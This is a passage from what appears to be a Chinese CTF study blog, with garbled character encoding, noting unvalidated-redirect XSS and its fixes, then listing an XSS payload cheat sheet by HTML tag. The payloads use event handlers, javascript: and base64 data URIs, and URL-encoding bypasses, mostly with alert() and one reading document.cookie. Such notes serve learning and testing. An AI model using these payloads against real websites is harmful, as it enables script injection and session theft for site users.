<h2 id="æœªç»éªŒè¯çš„è·³è½¬-XSS"><a href="#æœªç»éªŒè¯çš„è·³è½¬-XSS" class="headerlink" title="æœªç»éªŒè¯çš„è·³è½¬ XSS"></a>æœªç»éªŒè¯çš„è·³è½¬ XSS</h2><pre><code class="highlight plaintext">æœ‰ä¸€äº›åœºæ™¯æ˜¯åç«¯éœ€è¦å¯¹ä¸€ä¸ªä¼ è¿›æ¥çš„å¾…è·³è½¬çš„ URL å‚æ•°è¿›è¡Œä¸€ä¸ª 302 è·³è½¬ï¼Œå¯èƒ½å…¶ä¸­ä¼šå¸¦æœ‰ä¸€äº›ç”¨æˆ·çš„æ•æ„Ÿï¼ˆcookieï¼‰ä¿¡æ¯ã€‚å¦‚æœæœåŠ¡å™¨ç«¯åš302 è·³è½¬ï¼Œè·³è½¬çš„åœ°å€æ¥è‡ªç”¨æˆ·çš„è¾“å…¥ï¼Œæ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€ä¸ªæ¶æ„çš„è·³è½¬åœ°å€æ¥æ‰§è¡Œè„šæœ¬ã€‚

é˜²æ­¢æœªç»éªŒè¯çš„è·³è½¬ XSSæ¼æ´çš„**ä¸¤ç§æªæ–½ï¼š**â‘ å¯¹å¾…è·³è½¬çš„ URL å‚æ•°åšç™½åå•æˆ–è€…æŸç§è§„åˆ™è¿‡æ»¤ï¼›â‘¡åç«¯æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„ä¿æŠ¤, æ¯”å¦‚ cookie ä½¿ç”¨æ¥æºéªŒè¯ã€‚</code></pre>

<h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h2 id="å¸¸ç”¨æ ‡ç­¾è¯­å¥"><a href="#å¸¸ç”¨æ ‡ç­¾è¯­å¥" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾è¯­å¥"></a>å¸¸ç”¨æ ‡ç­¾è¯­å¥</h2><h3 id><a href="#" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h3><p>å“ˆå“ˆï¼Œç»å…¸æ¬¾ï¼Œé‰´å®šä¸ºç¬¬ä¸€ä¸ªè¿‡æ»¤çš„</p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
&lt;script&gt;alert(/xss/)&lt;/script&gt;
&lt;script&gt;alert(<span class="number">123</span>)&lt;/script&gt;</code></pre>

<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>ä¹Ÿæ˜¯ç»å…¸æ¬¾(æŒ‡htmlé‡Œé¢)</p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/a&gt;</span>
<span class="string">&lt;a href=&quot;</span>x<span class="string">&quot; onfocus=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
&lt;<span class="selector-tag">a</span> href=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">a</span>&gt;
<span class="comment">/*å‘ƒå‘ƒï¼Œæ„Ÿè§‰è¦å¤šè®°è¿™äº›å±æ€§ï¼Œåæ­£å‰ç«¯è®¾è®¡ä¹Ÿè¦ç”¨åˆ°*/</span></code></pre>

<h3 id="-2"><a href="#-2" class="headerlink" title="&lt;img&gt;"></a>&lt;<code>img&gt;</code></h3><p>ä½œä¸ºä¸€ä¸ªå›¾ç‰‡è§¦å‘ï¼ŒæˆåŠŸè§¦å‘ä¼šæ˜¾ç¤ºä¸€ä¸ªç ´æŸçš„å›¾ç‰‡</p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=&quot;alert(<span class="number">1</span>)&quot;&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=eval(&quot;alert(<span class="number">1</span>)&quot;)&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="number">1</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</code></pre>

<h3 id="-3"><a href="#-3" class="headerlink" title="&lt;iframe&gt;"></a><code>&lt;iframe&gt;</code></h3><p>å†…åµŒæ¡†æ¶å…ƒç´ </p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;javascript:<span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt;test&lt;/iframe&gt;</span>
<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(document.cookie)<span class="string">&quot;&gt;&lt;/iframe&gt;</span>
<span class="string">&lt;iframe onload=&quot;</span><span class="built_in">alert</span>(<span class="string">&#x27;xss&#x27;</span>);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
&lt;<span class="selector-tag">iframe</span> onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
&lt;<span class="selector-tag">iframe</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">iframe</span>&gt;
&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre>

<h3 id="-4"><a href="#-4" class="headerlink" title="&lt;audio&gt;"></a><code>&lt;audio&gt;</code></h3><p>éŸ³é¢‘å…ƒç´ </p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">audio</span> <span class="attribute">src</span>=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;
&lt;<span class="selector-tag">audio</span>&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
&lt;<span class="selector-tag">audio</span> controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;
&lt;<span class="selector-tag">audio</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">source</span> <span class="attribute">src</span>=&quot;<span class="attribute">x</span>&quot;&gt;&lt;/<span class="selector-tag">audio</span>&gt;</code></pre>

<h3 id="video"><a href="#video" class="headerlink" title="video"></a><code>video</code></h3><p>è§†é¢‘å…ƒç´ </p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">video</span> <span class="attribute">src</span>=<span class="attribute">x</span> onerror=alert(<span class="number">1</span>)&gt;
&lt;<span class="selector-tag">video</span>&gt;&lt;<span class="selector-tag">source</span> onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
&lt;<span class="selector-tag">video</span> controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
&lt;<span class="selector-tag">video</span> controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;
&lt;<span class="selector-tag">video</span> controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">video</span>&gt;</code></pre>

<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a><code>svg</code></h3><p>çŸ¢é‡å›¾ç‰‡å…ƒç´ </p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">svg</span> onload=javascript:<span class="built_in">alert</span>(<span class="number">1</span>)&gt;
&lt;svg onload=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/svg&gt;</code></pre>

<h3 id="-5"><a href="#-5" class="headerlink" title="&lt;button&gt;"></a><code>&lt;button&gt;</code></h3><p>å…ƒç´ ä¸Šç‚¹å‡»é¼ æ ‡æ—¶è§¦å‘ï¼ˆ<del>å› ä¸ºäººå«button</del></p>
<p>å…ƒç´ å†…éƒ¨æ„é€ :</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">button</span> onclick=alert(<span class="number">1</span>)&gt;
&lt;<span class="selector-tag">button</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">button</span>&gt;</code></pre>

<h3 id="-6"><a href="#-6" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>htmlå½“ä¸­å¸¸è§„çš„åˆ‡å‰²å…ƒç´ ï¼Œä½†æ˜¯éœ€è¦urlcodeæ¥è¿›è¡Œç»•è¿‡</p>
<pre><code class="highlight css">åŸä»£ç ï¼š
&lt;<span class="selector-tag">div</span> onmouseover=&#x27;alert(<span class="number">1</span>)&#x27;&gt;<span class="selector-tag">DIV</span>&lt;/<span class="selector-tag">div</span>&gt;
ç»è¿‡urlç¼–ç ï¼š
&lt;<span class="selector-tag">div</span> onmouseover%<span class="number">3</span>d&#x27;alert%<span class="number">26</span>lpar%<span class="number">3</span>b1%<span class="number">26</span>rpar%<span class="number">3</span>b&#x27;&gt;<span class="selector-tag">DIV</span>&lt;%<span class="number">2</span>fdiv&gt;</code></pre>

<h3 id="-7"><a href="#-7" class="headerlink" title="&lt;object&gt;"></a><code>&lt;object&gt;</code></h3><p>åµŒå…¥å¯¹è±¡å…ƒç´ ï¼Œå¼•å…¥ä¸€ä¸ªå¤–éƒ¨èµ„æº</p>
<p>è¿™ä¸ªéœ€è¦å€ŸåŠ© data ä¼ªåè®®å’Œ base64 ç¼–ç æ¥å®ç°ç»•è¿‡</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">object</span> data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/<span class="selector-tag">object</span>&gt;</code></pre>

<h3 id="-8"><a href="#-8" class="headerlink" title="&lt;p&gt; "></a><code>&lt;p&gt; </code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">p</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
&lt;<span class="selector-tag">p</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
&lt;<span class="selector-tag">p</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
&lt;<span class="selector-tag">p</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;</code></pre>

<h3 id="-9"><a href="#-9" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">input</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;
&lt;<span class="selector-tag">input</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;</code></pre>

<h3 id="-10"><a href="#-10" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details</code>&gt;</h3><pre><code class="highlight css">&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;
&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;</code></pre>

<h3 id="-11"><a href="#-11" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">select</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/<span class="selector-tag">select</span>&gt;
&lt;<span class="selector-tag">select</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">select</span>&gt;
&lt;<span class="selector-tag">select</span> onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/<span class="selector-tag">select</span>&gt;</code></pre>

<h3 id="-12"><a href="#-12" class="headerlink" title="&lt;form&gt;"></a><code>&lt;form&gt;</code></h3><p>è¡¨å•å…ƒç´ </p>
<pre><code class="highlight css">&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt;</code></pre>

<h3 id="-13"><a href="#-13" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">body</span> onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">body</span>&gt;</code></pre>



















]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
</search>
